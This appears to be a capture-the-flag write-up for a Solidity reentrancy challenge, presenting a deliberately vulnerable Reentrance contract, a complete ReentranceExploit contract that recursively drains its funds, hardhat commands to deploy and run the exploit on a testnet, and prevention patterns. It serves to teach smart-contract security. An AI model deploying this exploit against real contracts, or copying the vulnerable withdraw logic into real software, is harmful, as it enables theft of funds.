# Level 10: Reentrancy Challenge

## Challenge Description

This level introduces the concept of reentrancy attacks, one of the most famous vulnerabilities in Ethereum smart contracts. The goal is to drain all the funds from the Reentrance contract by exploiting its vulnerable withdraw function.

## Contract Location

The challenge contract is located at:
```
/contracts/level-10-reentrancy/Reentrance.sol
```

## Understanding the Challenge

The `Reentrance` contract allows users to deposit ETH by calling `donate()`, check their balance with `balanceOf()`, and withdraw their funds with `withdraw()`. Here's the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

### The Vulnerability

The vulnerability is in the `withdraw()` function:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
```

This function has a critical flaw in its logic: it sends ETH to the caller **before** updating their balance. If the caller is a contract with a fallback/receive function that calls `withdraw()` again, it can repeatedly withdraw funds before its balance is updated, potentially draining the entire contract.

## Winning Strategy

To win this challenge, you need to:

1. Create an exploit contract that can receive ETH and recursively call the withdraw function
2. Deposit a small amount into the Reentrance contract to establish a balance
3. Call withdraw to initiate the reentrancy attack
4. Drain all funds from the contract

## Hint for Thinking

Ask yourself:
* What happens when the Reentrance contract sends ETH to another contract?
* In what order should state changes and external calls be made?
* Why is the order of operations important in smart contract code?

## Disclaimer

If you want to solve this challenge on your own, stop reading here and try to implement a solution based on the hints above. The complete solution is provided below.

---

## Solution

The solution is to create a malicious contract that exploits the reentrancy vulnerability by recursively calling the withdraw function before the victim contract updates its state.

### Understanding the Attack

The attack works because:

1. The victim contract sends ETH to the attacker contract before updating the attacker's balance
2. When the attacker contract receives ETH, its receive/fallback function is triggered
3. Inside this function, the attacker calls withdraw again before the first withdraw call has completed
4. This process repeats until all funds are drained from the victim contract

### Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceExploit {
    address public owner;
    address public targetContract;
    uint256 public initialDeposit;
    bool public attacking = false;

    constructor(address _targetContract) {
        owner = msg.sender;
        targetContract = _targetContract;
    }

    function attack() external payable {
        require(msg.sender == owner, "Only owner can call this function");
        require(msg.value > 0, "Need ETH to perform attack");
        initialDeposit = msg.value;

        // First, donate to ourselves to establish a balance
        (bool success, ) = targetContract.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        require(success, "Donation failed");

        // Then, start the attack by withdrawing
        attacking = true;
        withdrawAll();
    }

    function withdrawAll() public {
        require(attacking || msg.sender == owner, "Not in attack mode");
        
        // Get our current balance in the target contract
        (bool success, bytes memory data) = targetContract.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success, "Balance check failed");
        uint256 targetBalance = abi.decode(data, (uint256));
        
        // If there's a balance, withdraw it
        if (targetBalance > 0) {
            // Calculate amount to withdraw - either our balance or the contract's entire balance
            (success, data) = targetContract.call(
                abi.encodeWithSignature("withdraw(uint256)", targetBalance)
            );
            require(success, "Withdrawal failed");
        }
    }
    
    // This function is called when the target contract sends ETH back
    // If we're in attack mode, we recursively call withdraw again
    receive() external payable {
        if (attacking && address(targetContract).balance >= initialDeposit) {
            withdrawAll();
        } else if (attacking) {
            // We've drained the contract, stop the attack
            attacking = false;
        }
    }
    
    // Allow the owner to withdraw all ETH from this contract
    function withdraw() external {
        require(msg.sender == owner, "Only owner can call this function");
        payable(owner).transfer(address(this).balance);
    }
    
    // Get the balance of the target contract
    function getTargetBalance() external view returns (uint256) {
        return address(targetContract).balance;
    }
}
```

## Step-by-Step Solution Guide

### 1. Deploy the Reentrance Contract

If you're testing locally, deploy the Reentrance contract first:

```shell
npx hardhat deploy --tags reentrance
```

### 2. Deploy the ReentranceExploit Contract

Deploy the ReentranceExploit contract targeting the Reentrance contract:

```shell
npx hardhat deploy --tags reentrance-solution
```

Or with a specific Reentrance contract address:

```shell
TARGET_ADDRESS=0xYourReentranceAddress npx hardhat deploy --tags reentrance-solution --network sepolia
```

### 3. Execute the Exploit

Run the provided script to execute the reentrancy attack:

```shell
EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xTargetAddress npx hardhat run scripts/level-10-reentrancy/execute-reentrance-exploit.ts --network sepolia
```

Parameters:
- `EXPLOIT_ADDRESS`: Required - the address of your deployed ReentranceExploit contract
- `TARGET_ADDRESS`: Optional - will use the target address stored in the exploit contract if not provided

### 4. Verify Your Success

After executing the solution, verify that:
1. The Reentrance contract's balance has been drained
2. Your exploit contract or wallet now contains the stolen funds

## Lessons Learned

This challenge teaches important lessons about secure smart contract development:

1. **Checks-Effects-Interactions Pattern**: Always follow this pattern - first perform checks, then make state changes, and finally interact with external contracts. In this case, the Reentrance contract should have updated the user's balance before sending ETH.

2. **Reentrancy Guards**: Use modifiers to prevent reentrancy attacks, such as OpenZeppelin's `ReentrancyGuard`.

3. **Principle of Least Privilege**: Only expose the minimum functionality required for your contract to work, and be cautious when allowing external contracts to call your functions.

4. **Avoid External Calls When Possible**: External calls to unknown contracts can introduce unexpected risks.

5. **State Updates Before Transfers**: Always update contract state before making ETH transfers.

## Prevention Strategies

To prevent reentrancy attacks:

1. **Use the Checks-Effects-Interactions Pattern**: Always update the contract's state before making external calls.
   ```solidity
   // Good practice
   function withdraw(uint256 _amount) public {
       require(balances[msg.sender] >= _amount);
       balances[msg.sender] -= _amount; // Update state first
       (bool success, ) = msg.sender.call{value: _amount}(""); // External call last
       require(success, "Transfer failed");
   }
   ```

2. **Implement Reentrancy Guards**: Use modifiers to prevent functions from being called recursively.
   ```solidity
   bool private _locked;
   
   modifier nonReentrant() {
       require(!_locked, "ReentrancyGuard: reentrant call");
       _locked = true;
       _;
       _locked = false;
   }
   
   function withdraw(uint256 _amount) public nonReentrant {
       // Function body
   }
   ```

3. **Consider Pull Over Push Payments**: Let users withdraw funds themselves rather than sending funds automatically.

4. **Set Appropriate Gas Limits**: Use `transfer()` or `send()` which have a gas limit of 2300, which is not enough for the recipient to make a reentrant call (though this is not a full protection).

5. **Keep Contract Logic Simple**: The more complex your contract is, the harder it is to spot vulnerabilities.
